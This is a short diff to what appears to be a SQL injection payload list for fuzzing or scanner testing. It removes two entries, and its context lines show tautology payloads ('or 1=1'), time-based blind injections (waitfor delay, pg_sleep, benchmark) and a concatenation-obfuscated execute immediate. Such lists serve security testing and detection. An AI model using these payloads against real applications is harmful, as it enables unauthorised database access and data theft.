@@ -2,7 +2,6 @@
 %20or%201=1
 ; execute immediate 'sel' || 'ect us' || 'er'
 benchmark(10000000,MD5(1))#
-update
 ";waitfor delay '0:0:__TIME__'--
 1) or pg_sleep(__TIME__)--
 ||(elt(-3+5,bin(15),ord(10),hex(char(45))))
@@ -129,7 +128,6 @@ bfilename
 ;waitfor delay '0:0:__TIME__'--
  or 1=1--"
 x' AND userid IS NULL; --
-*/*
  or 'text' > 't'
  (select top 1
  or benchmark(10000000,MD5(1))#
